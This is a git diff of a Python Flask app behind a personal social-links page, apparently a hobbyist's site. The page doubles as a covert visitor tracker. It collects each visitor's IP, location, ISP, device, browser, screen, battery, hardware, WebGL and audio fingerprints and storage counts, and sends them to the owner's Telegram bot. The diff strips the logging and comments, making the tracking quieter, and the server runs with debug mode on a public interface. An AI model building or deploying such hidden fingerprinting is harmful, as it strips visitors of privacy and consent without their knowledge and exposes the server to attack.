@@ -21,15 +21,13 @@ screen_cache = {}
 SCREEN_CACHE_TTL = 5
 
 active_visitors = {}
-SESSION_TTL = 300  # 5 минут
+SESSION_TTL = 300
 
-# Кэш для предотвращения дублирования сообщений
 message_cache = {}
-MESSAGE_CACHE_TTL = 60  # 1 минута
+MESSAGE_CACHE_TTL = 60
 
 
 def check_internet_connection():
-    """Проверка подключения к интернету"""
     try:
         socket.create_connection(("8.8.8.8", 53), timeout=5)
         return True
@@ -38,7 +36,6 @@ def check_internet_connection():
 
 
 def check_telegram_connection():
-    """Проверка подключения к Telegram API"""
     try:
         response = requests.get("https://api.telegram.org", timeout=5)
         return response.status_code == 200
@@ -47,7 +44,6 @@ def check_telegram_connection():
 
 
 def _clean_message_cache():
-    """Очистка старых записей из кэша сообщений"""
     current_time = time.time()
     expired_hashes = [
         msg_hash for msg_hash, timestamp in message_cache.items()
@@ -59,72 +55,44 @@ def _clean_message_cache():
 
 def send_telegram_message(text: str):
     if not BOT_TOKEN or not CHAT_ID:
-        print("❌ Telegram токен или chat_id не указаны в .env")
         return False
 
-    # Проверяем интернет соединение
     if not check_internet_connection():
-        print("❌ Нет подключения к интернету")
         return False
 
-    # Проверяем доступность Telegram API
     if not check_telegram_connection():
-        print("❌ Telegram API недоступен")
         return False
 
-    # Проверка на дублирование сообщений
     message_hash = hashlib.md5(text.encode()).hexdigest()
     current_time = time.time()
 
-    # Если сообщение уже отправлялось недавно - пропускаем
     if message_hash in message_cache:
         if current_time - message_cache[message_hash] < MESSAGE_CACHE_TTL:
-            print("⏭️ Пропущено дублирующее сообщение")
             return False
 
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    payload = {
-        "chat_id": CHAT_ID,
-        "text": text,
-        "parse_mode": "HTML"
-    }
+    payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
 
     try:
-        print(f"📤 Отправка сообщения в Telegram...")
         response = requests.post(url, json=payload, timeout=15)
-
         if response.status_code == 200:
-            # Сохраняем в кэш время отправки
             message_cache[message_hash] = current_time
-            # Очищаем старые записи из кэша
             _clean_message_cache()
-            print("✅ Сообщение успешно отправлено в Telegram")
             return True
         else:
-            print(f"❌ Ошибка Telegram API: {response.status_code} - {response.text}")
             return False
-
-    except requests.exceptions.Timeout:
-        print("❌ Таймаут при отправке в Telegram")
-        return False
-    except requests.exceptions.ConnectionError:
-        print("❌ Ошибка подключения к Telegram")
-        return False
-    except Exception as e:
-        print(f"❌ Неизвестная ошибка при отправке в Telegram: {e}")
+    except:
         return False
 
 
 def get_battery_info(battery_level, battery_charging):
-    """Форматирование информации о батарее"""
     if battery_level is None:
         return "Неизвестно"
-
     try:
         level_percent = float(battery_level) * 100
         charging_status = "⚡ Заряжается" if battery_charging else "🔋 Разряжается"
         return f"{level_percent:.0f}% ({charging_status})"
-    except (ValueError, TypeError):
+    except:
         return "Ошибка данных"
 
 
@@ -177,11 +145,11 @@ def build_server_fingerprint(parts: dict):
 
 
 def get_geo_info(ip: str):
-    """Получение гео-информации с обработкой локальных IP"""
-    # Локальные IP адреса
-    local_ips = ['127.0.0.1', 'localhost', '192.168.', '10.', '172.16.', '172.17.', '172.18.', '172.19.',
-                 '172.20.', '172.21.', '172.22.', '172.23.', '172.24.', '172.25.', '172.26.', '172.27.',
-                 '172.28.', '172.29.', '172.30.', '172.31.']
+    local_ips = [
+        '127.0.0.1', 'localhost', '192.168.', '10.', '172.16.', '172.17.', '172.18.', '172.19.',
+        '172.20.', '172.21.', '172.22.', '172.23.', '172.24.', '172.25.', '172.26.', '172.27.',
+        '172.28.', '172.29.', '172.30.', '172.31.'
+    ]
 
     if any(ip.startswith(prefix) for prefix in local_ips):
         return "Локальная сеть", "Локальная сеть", "Локальная сеть", "🏠"
@@ -197,14 +165,13 @@ def get_geo_info(ip: str):
             cc = geo.get("countryCode", "").upper()
             if len(cc) == 2:
                 country_emoji = chr(127397 + ord(cc[0])) + chr(127397 + ord(cc[1]))
-    except Exception:
+    except:
         pass
 
     return city, isp, country, country_emoji
 
 
 def format_enhanced_data(enhanced_data):
-    """Форматирование расширенных данных для Telegram"""
     if not enhanced_data:
         return ""
 
@@ -219,28 +186,24 @@ def format_enhanced_data(enhanced_data):
 
         formatted = "\n\n🔍 <b>РАСШИРЕННЫЕ ДАННЫЕ:</b>\n"
 
-        # Устройство и браузер
         formatted += f"📱 <b>Устройство:</b>\n"
         formatted += f"   • Платформа: {device_info.get('platform', 'Неизвестно')}\n"
         formatted += f"   • Вендор: {device_info.get('vendor', 'Неизвестно')}\n"
         formatted += f"   • Языки: {', '.join(device_info.get('languages', []))}\n"
         formatted += f"   • Тач-поинты: {device_info.get('maxTouchPoints', 0)}\n"
 
-        # Экран
         formatted += f"📺 <b>Экран:</b>\n"
         formatted += f"   • Доступно: {screen_info.get('availWidth')}x{screen_info.get('availHeight')}\n"
         formatted += f"   • Глубина цвета: {screen_info.get('colorDepth')}bit\n"
         formatted += f"   • Ориентация: {screen_info.get('orientation', {}).get('type', 'unknown')}\n"
         formatted += f"   • Окно: {screen_info.get('innerWidth')}x{screen_info.get('innerHeight')}\n"
 
-        # Графика
         if webgl_info.get('supported'):
             formatted += f"🎮 <b>Графика:</b>\n"
             formatted += f"   • WebGL: {webgl_info.get('vendor', 'Неизвестно')}\n"
             formatted += f"   • Рендерер: {webgl_info.get('renderer', 'Неизвестно')}\n"
             formatted += f"   • Расширения: {len(webgl_info.get('extensions', []))}\n"
 
-        # Сеть
         if network_info.get('connection'):
             conn = network_info['connection']
             formatted += f"🌐 <b>Сеть:</b>\n"
@@ -248,7 +211,6 @@ def format_enhanced_data(enhanced_data):
             formatted += f"   • Скорость: {conn.get('downlink', 'Неизвестно')} Мбит/с\n"
             formatted += f"   • RTT: {conn.get('rtt', 'Неизвестно')}мс\n"
 
-        # Производительность
         if performance_info:
             formatted += f"⚡ <b>Производительность:</b>\n"
             formatted += f"   • FPS: {performance_info.get('fps', 'Неизвестно')}\n"
@@ -256,7 +218,6 @@ def format_enhanced_data(enhanced_data):
                 mem = performance_info['memory']
                 formatted += f"   • Память: {mem.get('usedJSHeapSize', 0)}/{mem.get('totalJSHeapSize', 0)}MB\n"
 
-        # Хранилища
         if storage_info:
             formatted += f"💾 <b>Хранилища:</b>\n"
             formatted += f"   • LocalStorage: {storage_info.get('localStorage', {}).get('length', 0)} записей\n"
@@ -264,15 +225,13 @@ def format_enhanced_data(enhanced_data):
             if storage_info.get('indexedDB'):
                 formatted += f"   • IndexedDB: {len(storage_info['indexedDB'].get('databaseNames', []))} БД\n"
 
-        # Аудио
         if audio_info.get('webAudioSupported'):
             formatted += f"🎵 <b>Аудио:</b>\n"
             formatted += f"   • Устройств: {len(audio_info.get('mediaDevices', []))}\n"
             formatted += f"   • Фингерпринт: {audio_info.get('audioFingerprint', 'Неизвестно')[:20]}...\n"
 
         return formatted
-    except Exception as e:
-        print(f"❌ Ошибка форматирования расширенных данных: {e}")
+    except:
         return ""
 
 
@@ -284,7 +243,6 @@ def log_visitor():
 
     ip_raw = request.headers.get("X-Forwarded-For", request.remote_addr)
     ip = ip_raw.split(",")[0].strip() if ip_raw and "," in ip_raw else ip_raw
-
     user_agent = request.headers.get("User-Agent", "Неизвестно")
     now = time.time()
     visitor_id = request.cookies.get("visitor_id")
@@ -310,13 +268,11 @@ def log_visitor():
         active_visitors[visitor_id] = {"ip": ip, "time": now, "logged": False}
 
     city, isp, country, country_emoji = get_geo_info(ip)
-
     os_name = detect_os(user_agent)
     device_model = detect_device_model(user_agent)
     parsed = httpagentparser.simple_detect(user_agent)
     browser_name = parsed[1] if parsed and parsed[1] else "Неизвестно"
-    browser_language = request.headers.get("Accept-Language", "Неизвестно").split(',')[0].split(';')[
-        0].strip() if request.headers.get("Accept-Language") else "Неизвестно"
+    browser_language = request.headers.get("Accept-Language", "Неизвестно").split(',')[0].split(';')[0].strip() if request.headers.get("Accept-Language") else "Неизвестно"
     protocol = "HTTPS" if request.is_secure else "HTTP"
     domain = request.headers.get("Host", "Неизвестно")
 
@@ -332,7 +288,6 @@ def log_visitor():
     cpu_guess = detect_cpu_from_ua(user_agent)
     gpu_guess = "Неизвестно"
 
-    # Создаем базовое сообщение с разрешением экрана
     base_message = (
         f"📡 IP: {ip}\n"
         f"🏙️ Город: {city}\n"
@@ -351,7 +306,6 @@ def log_visitor():
         f"📍 Страница: {path}\n"
     )
 
-    # Сохраняем базовые данные для посетителя
     active_visitors[visitor_id]["base_message"] = base_message
     active_visitors[visitor_id]["logged"] = True
     g.new_visitor_id = visitor_id
@@ -379,7 +333,7 @@ def index():
     bio = {
         "nickname": "JIARBUZ",
         "links": [
-            {"name": "Telegram", "url": "tg://resolve?domain=jiarbyz", "icon": "fa-brands fa-telegram"},
+            {"name": "Telegram", "url": "tg://resolve?domain=O3EPO_KP0Bl", "icon": "fa-brands fa-telegram"},
             {"name": "GitHub", "url": "https://github.com/jiarbuz", "icon": "fa-brands fa-github"},
             {"name": "Steam", "url": "https://steamcommunity.com/id/jiarbuz", "icon": "fa-brands fa-steam"},
             {"name": "LolzTeam", "url": "https://lolz.live/members/4265472/", "icon": "fa-solid fa-eye"},
@@ -389,10 +343,8 @@ def index():
             {"name": "TikTok", "url": "https://www.tiktok.com/@jiarbuz", "icon": "fa-brands fa-tiktok"},
             {"name": "Discord", "url": "https://discord.com/users/971767339282497536", "icon": "fa-brands fa-discord"},
             {"name": "Twitch", "url": "https://www.twitch.tv/jiarbuz228", "icon": "fa-brands fa-twitch"},
-            {"name": "Reddit", "url": "https://www.reddit.com/user/WatermelonJuicy2/",
-             "icon": "fa-brands fa-reddit-alien"},
-            {"name": "Donate", "url": "https://yoomoney.ru/fundraise/1B54G3B36G9.250627",
-             "icon": "fa-solid fa-hand-holding-heart"},
+            {"name": "Reddit", "url": "https://www.reddit.com/user/WatermelonJuicy2/", "icon": "fa-brands fa-reddit-alien"},
+            {"name": "Donate", "url": "https://yoomoney.ru/fundraise/1B54G3B36G9.250627", "icon": "fa-solid fa-hand-holding-heart"}
         ]
     }
     response = make_response(render_template("index.html", bio=bio))
@@ -410,12 +362,9 @@ def screen_info():
         if not visitor_id:
             return {"error": "No visitor session"}, 400
 
-        # Получаем базовое сообщение из сессии
-        base_message = ""
         if visitor_id in active_visitors and "base_message" in active_visitors[visitor_id]:
             base_message = active_visitors[visitor_id]["base_message"]
         else:
-            # Если нет базового сообщения, создаем минимальное
             ip_raw = request.headers.get("X-Forwarded-For", request.remote_addr)
             ip = ip_raw.split(",")[0].strip() if ip_raw and "," in ip_raw else ip_raw
             user_agent = request.headers.get("User-Agent", "Неизвестно")
@@ -427,7 +376,6 @@ def screen_info():
                 f"📍 Страница: /\n"
             )
 
-        # Извлекаем данные из запроса
         width = data.get("width")
         height = data.get("height")
         scale = data.get("scale", 1.0)
@@ -443,29 +391,20 @@ def screen_info():
         plugins = data.get("plugins", "Неизвестно")
         client_fingerprint = data.get("fingerprint", None)
 
-        # Расширенные данные
         enhanced_data = data.get("enhancedData")
 
-        # Обновляем кэш экрана
         ip_raw = request.headers.get("X-Forwarded-For", request.remote_addr)
         ip = ip_raw.split(",")[0].strip() if ip_raw and "," in ip_raw else ip_raw
 
         screen_res = "Неизвестно"
         if width and height:
             screen_res = f"{width}x{height}"
-            screen_cache[ip] = {
-                "resolution": screen_res,
-                "scale": str(scale),
-                "time": time.time()
-            }
+            screen_cache[ip] = {"resolution": screen_res, "scale": str(scale), "time": time.time()}
 
-        # Форматируем информацию о батарее
         battery_info = get_battery_info(battery_level, battery_charging)
 
-        # Форматируем расширенные данные
         enhanced_info = format_enhanced_data(enhanced_data)
 
-        # Создаем финальное сообщение
         full_message = (
             f"{base_message}"
             f"⚙️ CPU ядер: {hardware_concurrency}\n"
@@ -481,27 +420,19 @@ def screen_info():
             f"{enhanced_info}"
         )
 
-        print("📨 Подготовка расширенного сообщения для Telegram...")
-        print(f"📝 Длина сообщения: {len(full_message)} символов")
-
         if send_telegram_message(full_message):
-            print("✅ Расширенное сообщение успешно отправлено в Telegram")
             return jsonify({"status": "success"}), 200
         else:
-            print("❌ Не удалось отправить расширенное сообщение в Telegram")
-            # Сохраняем сообщение в файл для отладки
             try:
                 with open("enhanced_messages.log", "a", encoding="utf-8") as f:
                     f.write(f"=== {time.strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                     f.write(full_message)
                     f.write("\n\n")
-                print("💾 Расширенное сообщение сохранено в enhanced_messages.log")
             except:
                 pass
             return jsonify({"status": "failed"}), 500
 
-    except Exception as e:
-        print(f"❌ Ошибка screen_info: {e}")
+    except:
         return {"error": "Internal error"}, 500
 
 
@@ -539,22 +470,12 @@ def sitemap():
 
 
 if __name__ == "__main__":
-    print("🔍 Проверка подключения...")
-    if check_internet_connection():
-        print("✅ Подключение к интернету есть")
-    else:
-        print("❌ Нет подключения к интернету")
-
-    if check_telegram_connection():
-        print("✅ Telegram API доступен")
-    else:
-        print("❌ Telegram API недоступен")
+    check_internet_connection()
+    check_telegram_connection()
 
     cert_path = os.path.join(os.getcwd(), "certs", "cert.pem")
     key_path = os.path.join(os.getcwd(), "certs", "key.pem")
     if os.path.exists(cert_path) and os.path.exists(key_path):
-        print("🔐 HTTPS включён (локальный сертификат).")
         app.run(host="0.0.0.0", port=5000, ssl_context=(cert_path, key_path), debug=True)
     else:
-        print("🌐 Сертификаты не найдены — запускаю HTTP.")
         app.run(host="0.0.0.0", port=5000, debug=True)
